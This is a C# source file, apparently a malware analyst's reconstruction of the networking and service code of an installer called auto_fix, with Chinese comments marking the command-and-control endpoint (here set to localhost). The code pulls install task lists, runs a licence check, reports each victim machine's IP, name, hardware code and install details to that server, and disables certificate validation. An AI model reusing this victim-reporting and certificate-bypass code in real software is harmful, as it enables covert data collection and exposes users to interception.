// 还原自 AutoInstall.exe (auto_fix) —— HTTP 客户端 + 业务接口
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Web.Script.Serialization;
using auto_fix.Data;

namespace auto_fix.WebReqst
{
    public class HttpRequester
    {
        public class ResponseResult
        {
            public bool IsSuccess { get; set; }
            public int StatusCode { get; set; }
            public string StatusDescription { get; set; }
            public WebHeaderCollection Headers { get; set; }
            public byte[] BodyBytes { get; set; }
            public string BodyString { get; set; }
            public Uri ResponseUri { get; set; }
            public string ErrorMessage { get; set; }
        }

        public int Timeout { get; set; }
        public string UserAgent { get; set; }
        public bool IgnoreInvalidCertificates { get; set; }
        public IWebProxy Proxy { get; set; }
        public CookieContainer Cookies { get; set; }

        public HttpRequester()
        {
            Timeout = 15000;
            UserAgent = "auto_fix/HttpRequester";
            IgnoreInvalidCertificates = false;
            Cookies = new CookieContainer();
        }

        public HttpRequester(int timeout, string userAgent)
        {
            Timeout = timeout;
            UserAgent = userAgent;
            Cookies = new CookieContainer();
        }

        // 与原样本一致：无条件信任任何证书
        private void EnsureCertificateSetting()
        {
            if (IgnoreInvalidCertificates)
            {
                ServicePointManager.ServerCertificateValidationCallback =
                    delegate { return true; };
            }
        }

        private HttpWebRequest CreateRequest(string url, string method, string contentType, int contentLength)
        {
            EnsureCertificateSetting();
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = method;
            req.Timeout = Timeout;
            req.ReadWriteTimeout = Timeout;
            req.UserAgent = UserAgent;
            req.CookieContainer = Cookies;
            if (Proxy != null) req.Proxy = Proxy;
            if (!string.IsNullOrEmpty(contentType)) req.ContentType = contentType;
            if (contentLength >= 0) req.ContentLength = contentLength;
            return req;
        }

        private ResponseResult BuildResult(HttpWebResponse resp)
        {
            ResponseResult r = new ResponseResult();
            r.IsSuccess = true;
            r.StatusCode = (int)resp.StatusCode;
            r.StatusDescription = resp.StatusDescription;
            r.Headers = resp.Headers;
            r.ResponseUri = resp.ResponseUri;
            r.BodyBytes = ReadAllBytes(resp.GetResponseStream());
            r.BodyString = Encoding.UTF8.GetString(r.BodyBytes);
            return r;
        }

        public ResponseResult Get(string url, Dictionary<string, string> headers)
        {
            try
            {
                HttpWebRequest req = CreateRequest(url, "GET", null, -1);
                ApplyHeaders(req, headers);
                using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                {
                    return BuildResult(resp);
                }
            }
            catch (WebException ex)
            {
                return HandleWebException(ex);
            }
        }

        public ResponseResult Post(string url, Dictionary<string, string> headers, byte[] body, string contentType)
        {
            try
            {
                if (!string.IsNullOrEmpty(contentType) == false) contentType = "application/json; charset=utf-8";
                HttpWebRequest req = CreateRequest(url, "POST", contentType, body == null ? 0 : body.Length);
                ApplyHeaders(req, headers);
                if (body != null && body.Length > 0)
                {
                    using (Stream s = req.GetRequestStream()) s.Write(body, 0, body.Length);
                }
                using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                {
                    return BuildResult(resp);
                }
            }
            catch (WebException ex)
            {
                return HandleWebException(ex);
            }
        }

        public ResponseResult PostForm(string url, Dictionary<string, string> form, Dictionary<string, string> headers)
        {
            byte[] body = Encoding.UTF8.GetBytes(BuildFormUrlEncoded(form));
            return Post(url, headers, body, "application/x-www-form-urlencoded");
        }

        private static void ApplyHeaders(HttpWebRequest req, Dictionary<string, string> headers)
        {
            if (headers == null) return;
            foreach (KeyValuePair<string, string> kv in headers)
            {
                if (string.Equals(kv.Key, "Content-Type", StringComparison.OrdinalIgnoreCase)) req.ContentType = kv.Value;
                else if (string.Equals(kv.Key, "accept", StringComparison.OrdinalIgnoreCase)) req.Accept = kv.Value;
                else if (string.Equals(kv.Key, "referer", StringComparison.OrdinalIgnoreCase)) req.Referer = kv.Value;
                else if (string.Equals(kv.Key, "content-type", StringComparison.OrdinalIgnoreCase)) req.ContentType = kv.Value;
                else req.Headers[kv.Key] = kv.Value;
            }
        }

        private static string BuildFormUrlEncoded(Dictionary<string, string> form)
        {
            StringBuilder sb = new StringBuilder();
            if (form != null)
            {
                foreach (KeyValuePair<string, string> kv in form)
                {
                    if (sb.Length > 0) sb.Append('&');
                    sb.Append(Uri.EscapeDataString(kv.Key)).Append('=').Append(Uri.EscapeDataString(kv.Value ?? ""));
                }
            }
            return sb.ToString();
        }

        private static byte[] ReadAllBytes(Stream s)
        {
            if (s == null) return new byte[0];
            using (MemoryStream ms = new MemoryStream())
            {
                byte[] buf = new byte[8192];
                int n;
                while ((n = s.Read(buf, 0, buf.Length)) > 0) ms.Write(buf, 0, n);
                return ms.ToArray();
            }
        }

        private ResponseResult HandleWebException(WebException ex)
        {
            ResponseResult r = new ResponseResult();
            r.IsSuccess = false;
            r.ErrorMessage = ex.Message;
            HttpWebResponse resp = ex.Response as HttpWebResponse;
            if (resp != null)
            {
                using (resp)
                {
                    r.StatusCode = (int)resp.StatusCode;
                    r.StatusDescription = resp.StatusDescription;
                    r.Headers = resp.Headers;
                    r.BodyBytes = ReadAllBytes(resp.GetResponseStream());
                    r.BodyString = Encoding.UTF8.GetString(r.BodyBytes);
                }
            }
            return r;
        }
    }

    public class HttpRequesterExample
    {
        public static void ShowDemoInMessageBox()
        {
            HttpRequester c = new HttpRequester();
            c.UserAgent = "auto_fix/HttpRequesterDemo";
            c.IgnoreInvalidCertificates = true;
            HttpRequester.ResponseResult r = c.Get("https://httpbin.org/get", null);
            System.Windows.Forms.MessageBox.Show(string.Format("Status: {0} {1}\r\nLength: {2}\r\n\r\n{3}",
                r.StatusCode, r.StatusDescription, r.BodyBytes == null ? 0 : r.BodyBytes.Length, r.BodyString));
        }
    }
}

namespace auto_fix.Services
{
    using auto_fix.WebReqst;

    public class WebSevice
    {
        public static readonly string ApiUrl = "http://127.0.0.1:3809";  // ← 唯一 C2
        public static int userId = -1;   // 原样本里 IsPassword 会同时写静态与实例字段
        private static string userPass = string.Empty;
        private static readonly HttpRequester client = CreateClient();

        private static HttpRequester CreateClient()
        {
            HttpRequester c = new HttpRequester(15000, "auto_fix/HttpRequesterDemo");
            c.IgnoreInvalidCertificates = true;
            return c;
        }

        // 拉取安装任务清单
        public static AppMessage GetAppData()
        {
            Dictionary<string, string> form = new Dictionary<string, string>();
            form.Add("key", "hq");
            HttpRequester.ResponseResult r = client.PostForm(ApiUrl + "/api/user/getAppInfos", form, null);
            JavaScriptSerializer js = new JavaScriptSerializer();
            js.MaxJsonLength = 64 * 1024 * 1024;
            return js.Deserialize<AppMessage>(r.BodyString);
        }

        // 授权码校验（原样本里是死代码，实际校验内联在 Form1.IsPassword）
        public static bool Validate(UserValidationRequest req)
        {
            Dictionary<string, string> h = new Dictionary<string, string>();
            h.Add("Accept", "application/json");
            JavaScriptSerializer js = new JavaScriptSerializer();
            byte[] body = Encoding.UTF8.GetBytes(js.Serialize(req));
            HttpRequester.ResponseResult r = client.Post(ApiUrl + "/api/user/validate", h, body, "application/json; charset=utf-8");
            UserValidationResponse resp = js.Deserialize<UserValidationResponse>(r.BodyString);
            if (resp != null && resp.IsValid)
            {
                userId = resp.UserId;
                userPass = resp.Name;
                return true;
            }
            System.Windows.Forms.MessageBox.Show("验证错误");
            Environment.Exit(0);
            return false;
        }

        // 安装结果上报（注意：这里绕过 HttpRequester，直接 new HttpWebRequest）
        public static bool SubmitInfo(RegistrationRequest req, string extra)
        {
            string url = ApiUrl + "/api/user/register";
            req.UserId = userId;
            if (extra != null && extra.Length > 1) req.Other = extra + req.Other;

            JavaScriptSerializer js = new JavaScriptSerializer();
            js.MaxJsonLength = 64 * 1024 * 1024;
            string json = js.Serialize(new
            {
                userIP = req.UserIP,
                computerName = req.ComputerName,
                computerCode = req.ComputerCode,
                product = req.Product,
                installPath = req.InstallPath,
                installDate = DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
                userId = req.UserId,
                other = req.Other
            });
            byte[] body = Encoding.UTF8.GetBytes(json);

            try
            {
                HttpWebRequest hreq = (HttpWebRequest)WebRequest.Create(url);
                hreq.Method = "POST";
                hreq.ContentType = "application/json; charset=utf-8";
                hreq.ContentLength = body.Length;
                hreq.Timeout = 30000;
                using (Stream s = hreq.GetRequestStream()) s.Write(body, 0, body.Length);
                using (HttpWebResponse resp = (HttpWebResponse)hreq.GetResponse())
                using (Stream rs = resp.GetResponseStream())
                {
                    if (rs == null) throw new Exception("响应流为空");
                    string text = new StreamReader(rs, Encoding.UTF8).ReadToEnd();
                    RegistrationResponse rr = js.Deserialize<RegistrationResponse>(text);
                    return rr != null;
                }
            }
            catch
            {
                return false;
            }
        }

        public static bool SubmitInfo_ed(RegistrationRequest req, string extra)
        {
            Dictionary<string, string> h = new Dictionary<string, string>();
            h.Add("Accept", "application/json");
            if (extra != null && extra.Length > 1) req.Other = extra + req.Other;
            JavaScriptSerializer js = new JavaScriptSerializer();
            js.MaxJsonLength = 64 * 1024 * 1024;
            byte[] body = Encoding.UTF8.GetBytes(js.Serialize(new
            {
                userIP = req.UserIP, computerName = req.ComputerName, computerCode = req.ComputerCode,
                product = req.Product, installPath = req.InstallPath,
                installDate = DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
                userId = req.UserId, other = req.Other
            }));
            HttpRequester.ResponseResult r = client.Post(ApiUrl + "/api/user/register", h, body, "application/json; charset=utf-8");
            RegistrationResponse resp = js.Deserialize<RegistrationResponse>(r.BodyString);
            if (resp == null) { Program.OutputMessage("错误：请求数据为null"); return false; }
            return true;
        }
    }
}
